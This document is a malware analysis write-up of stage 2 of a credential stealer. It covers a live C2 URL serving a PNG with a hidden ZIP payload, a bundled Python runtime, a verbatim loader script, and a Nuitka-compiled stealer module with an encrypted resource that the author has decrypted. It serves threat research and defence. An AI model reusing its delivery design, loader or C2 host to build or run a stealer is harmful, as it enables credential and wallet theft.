# Stage 2 — what the C2 serves

> No binaries are published here. The sample jar, the PNG carrier and `app.pyd` are identified by hash in
> [../IOCS.md](../IOCS.md); `main.py` below is included as documentation of how the module is loaded.
> Handle any copy only in an isolated environment.

The on-chain domain resolves through Cloudflare and **serves the payload**, so the campaign is live:

```
GET https://thisisafalsepositive.st/cdn/v2/9f4e7a2c1b8d.png
  -> 16,956,757 bytes, PNG 720x720 8-bit RGB (a real image with the payload appended)
  SHA-256 fb8100225454c882831f7b53b0f7dcacc4d41cb9b3abd46255695100d88331f7
```

## The PNG stego

```
chunks: IHDR, pHYs, IDAT x50 (4096 each), IDAT(2622), hIds(16,539,137), IEND
```

The `hIds` chunk holds a zlib stream (the loader uses `new Inflater()`, which also accepts the zlib
wrapper) inflating to 16,675,906 bytes — a ZIP with 767 entries. To unpack:

```bash
python3 ../tools/png_extract.py 9f4e7a2c1b8d.png -o extracted/
```

## What the archive contains

A complete **portable Python 3.12 runtime** plus two files that matter:

| Entry | Size | Role |
|---|---:|---|
| `AppHost/main.py` | 353 | entry point (below) — SHA-256 `bc87ec29…afb1` |
| `AppHost/app.pyd` | 1,852,928 | the stealer itself — SHA-256 `4d7ac018…a410` (not published; see [CRACKED.md](CRACKED.md) for what it contains) |
| `python.exe`, `pythonw.exe`, `python312.dll`, `python312.zip` | ~10 MB | stock CPython 3.12 embeddable |
| `_sqlite3.pyd`, `sqlite3.dll` | 1.67 MB | SQLite — the usual way into browser/credential stores |
| `_ssl.pyd`, `libssl-3.dll`, `libcrypto-3.dll` | 6 MB | TLS for the exfil channel |
| `_ctypes.pyd`, `libffi-8.dll` | | direct Win32 calls from Python |
| `_wmi.pyd`, `wmi.py` | | WMI system inventory |

and a stripped-down third-party set in `Lib/site-packages` that says a great deal about intent:

| Package | Size | What it is for |
|---|---:|---|
| **`Crypto`** (pycryptodome) | 5.1 MB | AES, ChaCha20, ARC4, PKCS, Scrypt — full cipher suite on the victim's machine |
| **`PIL`** (Pillow) | 4.0 MB | image handling — screen capture / screenshot processing |
| **`requests`** (+ `urllib3`, `certifi`, `idna`, `charset_normalizer`) | 0.5 MB | the HTTP client for exfiltration |
| **`psutil`** | 0.44 MB | process enumeration — security tools, running games/browsers |
| **`vdf`** | 28 KB | Valve's KeyValues format — reading Steam's `loginusers.vdf` / `config.vdf` |
| **`adodbapi`** | | database access via ADO |
| **pywin32** (`win32api`, `win32security`, `win32process`, `win32com`, `win32serviceutil`) | | tokens, privileges, process and service manipulation |

A stealer that ships `vdf` is reading Steam files. One that ships Pillow plus `psutil` and pywin32 is
taking screenshots, walking the process list and touching tokens/services. That is inference from the
dependency set rather than observed behaviour — but it is a very narrow set for a "mod", and every piece
of it has an obvious use in a credential stealer.

The runtime is exactly what it claims: self-contained Python + dependencies that never touch the victim's
installed Python. Only `AppHost/main.py` and `AppHost/app.pyd` are kept in this folder — the remaining 765
entries are stock CPython/pywin32/Pillow/etc. and add nothing to the record (and would just be other
people's licensed code in a repo).

## `AppHost/main.py` — verbatim (the only cleartext code in stage 2)

```python
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import importlib.util
spec = importlib.util.spec_from_file_location("app", os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.pyd"))
app = importlib.util.module_from_spec(spec)
sys.modules["app"] = app
spec.loader.exec_module(app)
if __name__ == "__main__":
    app.run()
```

Nothing but load `app.pyd` and call `run()`. The module is loaded by path rather than name, so it works
from any directory — and there is no `.py` source on disk anywhere.

## `AppHost/app.pyd`

| Property | Value |
|---|---|
| Type | PE32+ DLL, x86-64 (`app.cp312-win_amd64.pyd`) |
| Export | `PyInit_app` (single export) → CPython extension module |
| Imports | `python312.dll`, `VCRUNTIME140.dll`, `api-ms-win-crt-*`, `KERNEL32.dll` — **no** wininet/winhttp/ws2_32/advapi32/crypt32 |
| Kernel32 used directly | `GetModuleHandleExA`, `FindResourceA`, `LoadResource`, `LockResource`, `GetProcAddress`, `LoadLibraryExW`, `GetModuleFileNameW`, `GetShortPathNameW`, `GetCurrentProcessId`, `GetCurrentThreadId`, `GetSystemTimeAsFileTime`, `QueryPerformanceCounter`, `SetErrorMode`, `GetLastError`, `FormatMessageA` |
| Compiler fingerprint | **Nuitka** — `__compiled__`, `compiled_method`, `class nuitka_distribution(Distribution)`, `ag_frame is not writable in Nuitka`. Python source compiled to C, then to machine code. |
| Sections | `.text` 1,518,008 (ent 6.28), `.rdata` 59,018, `.data` 15,872, `.pdata`, **`.rsrc` 237,552 (ent 7.98)**, `.reloc` |

### The blob inside the module — cracked

See [CRACKED.md](CRACKED.md) for the algorithm, the disassembly and what the plaintext reveals. Short
version: it is an S-box substitution with a ciphertext-fed rolling key, not a cipher; decrypting it gives
Nuitka's constants store, which exposes the entire feature set of the stealer.

The resource directory has exactly one entry:

```
RT_RCDATA, name/id 3, 237,461 bytes, entropy 7.984
header: d4 69 fb 92 | 7d 9f 03 00 | <16 bytes> | <237,437 bytes of ciphertext>
                 ^tag/checksum   ^LE length = size - 24
```

The resource itself:

* The loader resolves `FindResourceA`/`LoadResource`/`LockResource` in compiled code (they sit in
  Nuitka's own import table, not as Python-level `ctypes` strings), reads resource **3** of type
  `RT_RCDATA`, decrypts it, and hands the plaintext to the interpreter.
* Nothing about it is standard crypto: no AES S-box, no ChaCha sigma, no SHA-256 K table, no zlib stream
  that inflates to anything useful — the "cipher" is a hand-written substitution loop in `.text`.
* Repeating-key analysis over the ciphertext finds nothing (best repeating-XOR entropy 7.979 at period 64),
  so it is a proper stream cipher, not a short XOR key.
* No Python-level strings are visible in the module at all: every string, name and docstring lives inside
  that resource, which is why the binary looks far emptier than what it does.
* `QueryPerformanceCounter` + `GetSystemTimeAsFileTime` are imported: either key material mixed with
  environment state, or timing checks. Not distinguishable statically.

### Recovering it

```bash
python3 ../tools/app_pyd_decrypt.py app.pyd -o app_constants.bin --strings
```

The tool locates the S-box and the key-schedule jump table by their instruction patterns, decrypts resource
3, verifies the stored checksum and dumps the readable constants. Output for this sample: 237,437 bytes
starting with `.bytecode`, SHA-256 `4b8880d0a1474bb27d1a400b0e5ba35f8f2256e5079ed499dfebdef8638e4584`.

## What stage 2 does

Established by the decrypted constants (see [CRACKED.md](CRACKED.md)): browser credentials/cookies/cards/
Google tokens/autofills across Chrome, Edge, Brave, Opera, Opera GX and Firefox; Discord tokens and
injection; Telegram `tdata`; Steam vdf tokens; Roblox cookies; Minecraft launcher and Microsoft account
files; ten wallet types; screenshots; keyword file grabs; WMI inventory; DPAPI/Fernet use; a local status
server for single-instance/persistence checks; and runtime downloads from `/cdn/` and `/cdn/e/`.

It is launched as `python.exe AppHost\main.py -u <userId> --mcInfo <b64 session> [--env prod] [--tag]
[--prefireId] [--host] [--dk]` from `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\AppHost`, output
appended to `_stealer.log`.
